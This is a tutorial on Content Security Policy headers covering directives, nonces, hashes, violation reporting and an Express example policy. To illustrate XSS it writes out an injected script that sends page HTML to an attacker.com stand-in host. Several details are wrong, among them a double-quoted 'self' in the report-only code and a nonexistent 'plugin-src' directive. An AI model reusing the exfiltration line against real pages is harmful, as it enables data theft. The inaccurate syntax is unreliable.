# Content Security Policy (CSP)

## Definition

Content Security Policy (CSP) is an HTTP response header that allows websites to declare which resources (scripts, styles, images, fonts, etc.) are trusted and allowed to load on a page. CSP mitigates attacks like Cross-Site Scripting (XSS), injection attacks, and clickjacking by restricting what content can be executed or loaded.

The header format:
```
Content-Security-Policy: directive1 source1 source2; directive2 source3; ...
```

Or in test mode:
```
Content-Security-Policy-Report-Only: directive1 source1; ...
```

CSP works by:
1. Server declares which sources are allowed for each resource type
2. Browser receives the policy header
3. Browser enforces the policy by blocking disallowed resources
4. Browser reports violations (optionally)

## How CSP Works as an HTTP Header

### Policy Enforcement

When a browser receives a CSP header, it enforces the policy on all resources loaded on that page:

```
Server Response:
Content-Security-Policy: script-src 'self' https://cdn.example.com; img-src *

Browser loads page:
<script src="/app.js"></script> ✓ ALLOWED (matches 'self')
<script src="https://cdn.example.com/lib.js"></script> ✓ ALLOWED
<script src="https://evil.com/hack.js"></script> ✗ BLOCKED
<img src="https://example.com/image.png"> ✓ ALLOWED
<img src="data:image/png;base64,..."> ✓ ALLOWED (img-src: *)
```

### Violation Reporting

CSP can report violations to a server endpoint:

```
Content-Security-Policy: script-src 'self'; report-uri /csp-report

Browser detects violation:
POST /csp-report
{
  "csp-report": {
    "document-uri": "https://example.com/page",
    "violated-directive": "script-src",
    "effective-directive": "script-src-elem",
    "original-policy": "script-src 'self'; report-uri /csp-report",
    "blocked-uri": "https://evil.com/hack.js",
    "status-code": 200
  }
}
```

## Key CSP Directives

### default-src

The fallback directive that applies to all resource types not explicitly specified:

```
Content-Security-Policy: default-src 'self'

Means:
- Scripts from 'self' only
- Styles from 'self' only
- Images from 'self' only
- Fonts from 'self' only
- etc.
```

### script-src

Controls which scripts can be executed:

```
Content-Security-Policy: script-src 'self' https://trusted-cdn.com
```

Allowed sources:
- `'self'`: Same origin
- `'unsafe-inline'`: Inline scripts (DANGEROUS - defeats XSS protection)
- `'unsafe-eval'`: eval() and similar (DANGEROUS)
- `'strict-dynamic'`: Only inline scripts with nonce or hash
- `'nonce-RANDOM'`: Specific inline script with nonce
- `'hash-SHA256-BASE64'`: Specific inline script with hash
- Domain URLs: `https://cdn.example.com`

### style-src

Controls which stylesheets can be loaded:

```
Content-Security-Policy: style-src 'self' https://fonts.googleapis.com
```

Same sources as script-src. Also supports:
- Inline styles (with nonce or hash)
- Style URLs
- Font URLs (often specified with font-src)

### img-src

Controls which images can be loaded:

```
Content-Security-Policy: img-src 'self' https: data:
```

- `https:`: Any HTTPS image
- `data:`: Data URI images
- `blob:`: Blob URLs

### connect-src

Controls which origins can be connected to via fetch, XHR, WebSocket, EventSource:

```
Content-Security-Policy: connect-src 'self' https://api.example.com wss://socket.example.com
```

Critical for protecting APIs from unauthorized cross-origin requests.

### frame-ancestors

Controls which origins can embed this page in a frame (iframe):

```
Content-Security-Policy: frame-ancestors 'none'
```

Prevents clickjacking attacks. Values:
- `'none'`: Cannot be framed
- `'self'`: Can only be framed by same origin
- Specific origins: `https://trusted.example.com`

### form-action

Controls which origins form submissions can be sent to:

```
Content-Security-Policy: form-action 'self' https://api.example.com
```

Prevents form hijacking attacks.

### upgrade-insecure-requests

Automatically upgrades HTTP requests to HTTPS:

```
Content-Security-Policy: upgrade-insecure-requests
```

The browser will:
- Change `http://example.com` to `https://example.com`
- Change `<img src="http://...">` to HTTPS

### base-uri

Restricts the base URL for relative URLs:

```
Content-Security-Policy: base-uri 'self'
```

Prevents attackers from changing the base URL in a page.

### object-src and plugin-src

Controls which plugins (Flash, Java) can load:

```
Content-Security-Policy: object-src 'none'
```

Modern approach: disable all plugins.

## Nonces and Hashes for Inline Scripts

### The Problem with Inline Scripts

```html
<script>
  // Vulnerable: Can be injected with XSS
  const apiKey = "secret123";
  fetch('/api/data');
</script>
```

If the page has an XSS vulnerability, attacker can inject:

```javascript
<script>
  // Attacker's injected script
  fetch('http://attacker.com/steal?data=' + document.body.innerHTML);
</script>
```

### Solution 1: Nonce (Number Used Once)

A nonce is a random value generated per page load that authorizes specific inline scripts:

```javascript
// Server generates random nonce
const nonce = crypto.randomBytes(16).toString('base64');

// Server includes nonce in CSP header
res.setHeader('Content-Security-Policy', `script-src 'nonce-${nonce}'`);

// Server injects nonce into HTML template
res.render('page', { nonce });
```

```html
<!-- Template includes nonce in inline script -->
<script nonce="<%= nonce %>">
  const apiKey = "secret123";
  fetch('/api/data');
</script>

<!-- Injected script without nonce is blocked -->
<script>
  fetch('http://attacker.com/steal');
</script>
<!-- ✗ BLOCKED: Doesn't have nonce -->
```

### Solution 2: Hash

A hash of the inline script content is included in CSP:

```javascript
// Server calculates hash of inline script
const scriptContent = `
  const apiKey = "secret123";
  fetch('/api/data');
`;

const hash = crypto
  .createHash('sha256')
  .update(scriptContent)
  .digest('base64');

res.setHeader('Content-Security-Policy', `script-src 'sha256-${hash}'`);
```

```html
<!-- Exact script content must match hash -->
<script>
  const apiKey = "secret123";
  fetch('/api/data');
</script>
<!-- ✓ ALLOWED: Hash matches -->

<!-- Any change (even whitespace) breaks hash -->
<script>
  const apiKey = "secret123";
  fetch('/api/data'); // Extra space
</script>
<!-- ✗ BLOCKED: Hash doesn't match -->
```

### Nonce vs Hash

**Nonce:**
- Pros: Allows dynamic script content
- Cons: Must generate per request, more overhead

**Hash:**
- Pros: No per-request overhead, works with static content
- Cons: Cannot use for dynamic content, breaks if script changes

## unsafe-inline and unsafe-eval Dangers

### unsafe-inline

Allows inline scripts and styles without nonces or hashes:

```
Content-Security-Policy: script-src 'unsafe-inline'
```

Disables XSS protection:
```html
<!-- All inline scripts are allowed -->
<script>
  // Original code
</script>

<!-- Injected script is also allowed -->
<script>
  // Attacker's injected code - executes!
</script>
```

When to use: Only if you cannot use nonces/hashes (legacy applications).

### unsafe-eval

Allows eval() and similar dynamic code execution:

```
Content-Security-Policy: script-src 'unsafe-eval'
```

Dangerous because:
```javascript
// eval() becomes dangerous
eval("alert('XSS')"); // Allowed
eval(userInput); // If userInput is attacker-controlled, RCE

// Also affects:
new Function(userInput); // Dynamic functions
setTimeout("code", 1000); // setTimeout with string
setInterval("code", 1000); // setInterval with string
```

Most modern frameworks don't need eval(). Avoid it.

## report-uri and report-to Directives

### Deprecated: report-uri

Reports violations to a URL:

```
Content-Security-Policy: script-src 'self'; report-uri /csp-report
```

Browser sends POST request with violation details:

```json
{
  "csp-report": {
    "document-uri": "https://example.com/page",
    "violated-directive": "script-src",
    "original-policy": "script-src 'self'; report-uri /csp-report",
    "blocked-uri": "https://evil.com/hack.js"
  }
}
```

### Modern: report-to

Uses Reporting API (more flexible):

```
Content-Security-Policy: script-src 'self'; report-to csp-endpoint
```

Define the endpoint separately:

```
Reporting-Endpoints: csp-endpoint="https://example.com/reports"
```

Reports are sent to the configured endpoint with more details.

## CSP Level 3 strict-dynamic

`strict-dynamic` is a special source expression that allows inline scripts with nonces but disables allowlist-based bypasses:

```
Content-Security-Policy: script-src 'strict-dynamic' 'nonce-abc123'
```

Benefits:
- Inline scripts with nonce are allowed
- Scripts loaded by trusted scripts are allowed (propagation)
- Allowlist sources like domain names are ignored
- Prevents attackers from using JSONP, AngularJS, etc. for bypasses

Example:

```html
<!-- With 'strict-dynamic' -->
<script nonce="abc123">
  // Load external script
  const script = document.createElement('script');
  script.src = 'https://evil.com/hack.js';
  document.body.appendChild(script);
</script>
<!-- ✓ ALLOWED: Loaded by script with nonce -->

<!-- But explicit domain allowlist doesn't bypass strict-dynamic -->
<!-- This would be blocked even if 'https://evil.com' is in script-src -->
```

## Content-Security-Policy-Report-Only for Testing

Instead of enforcing CSP, you can test it in report-only mode:

```
Content-Security-Policy-Report-Only: script-src 'self'; report-uri /csp-report
```

In report-only mode:
- CSP violations are reported
- Violations do NOT block resources
- Useful for testing before enforcement

Typical workflow:

```javascript
// Phase 1: Test with report-only
res.setHeader('Content-Security-Policy-Report-Only', 'script-src "self"');

// Monitor reports, fix violations
// ...

// Phase 2: Enforce CSP
res.setHeader('Content-Security-Policy', 'script-src "self"');
```

## Example Policy for a React SPA

```javascript
const express = require('express');
const crypto = require('crypto');
const app = express();

// Generate nonce for each request
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  next();
});

// Set CSP header
app.use((req, res, next) => {
  const nonce = res.locals.nonce;

  const csp = [
    // Default policy
    "default-src 'none'",

    // Scripts
    `script-src 'strict-dynamic' 'nonce-${nonce}' https://cdn.example.com`,

    // Styles
    `style-src 'nonce-${nonce}' https://fonts.googleapis.com`,

    // Fonts
    "font-src 'self' https://fonts.gstatic.com",

    // Images
    "img-src 'self' https: data:",

    // API calls
    "connect-src 'self' https://api.example.com",

    // Forms
    "form-action 'self'",

    // Prevent framing
    "frame-ancestors 'none'",

    // Upgrade HTTP to HTTPS
    "upgrade-insecure-requests",

    // Report violations
    "report-uri /security/csp-report"
  ].join('; ');

  res.setHeader('Content-Security-Policy', csp);
  next();
});

// React app with nonce
app.get('/', (req, res) => {
  const nonce = res.locals.nonce;

  res.send(`
    <!DOCTYPE html>
    <html>
      <head>
        <meta charset="utf-8">
        <title>React App</title>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto">
      </head>
      <body>
        <div id="root"></div>
        <script nonce="${nonce}" src="/app.js"></script>
      </body>
    </html>
  `);
});

// CSP violation reporting
app.post('/security/csp-report', express.json(), (req, res) => {
  const report = req.body['csp-report'];
  console.error('CSP Violation:', {
    documentUri: report['document-uri'],
    violatedDirective: report['violated-directive'],
    blockedUri: report['blocked-uri'],
    originalPolicy: report['original-policy']
  });
  res.status(204).send();
});

app.listen(3000);
```

## Best Practices

1. **Start with report-only mode**: Test CSP before enforcing
2. **Use nonces for inline scripts**: Generate per-request for dynamic content
3. **Use hashes for static scripts**: No per-request overhead
4. **Avoid unsafe-inline and unsafe-eval**: Defeats XSS protection
5. **Use strict-dynamic**: For inline script allowlisting
6. **Be specific with source lists**: Don't use `*` or overly broad allowlists
7. **Use HTTPS sources**: Require encrypted resources
8. **Set frame-ancestors 'none'**: Prevent clickjacking
9. **Set form-action 'self'**: Prevent form hijacking
10. **Use upgrade-insecure-requests**: Force HTTPS
11. **Monitor violations**: Set up reporting and review logs
12. **Update policy over time**: Tighten as vulnerabilities are fixed
13. **Document your policy**: Team should understand each directive
14. **Test thoroughly**: Ensure legitimate content still loads
15. **Use CSP with other headers**: Combine with X-Frame-Options, X-Content-Type-Options, etc.
16. **Avoid dynamically generated CSP**: Easier to maintain if policy is static
17. **Use separate policies for different pages**: If needed, keep them consistent
18. **Don't rely on CSP alone**: Use it as a defense-in-depth layer
19. **Consider browser support**: CSP3 features may not be supported in older browsers
20. **Test with automated tools**: Include CSP validation in security testing pipeline
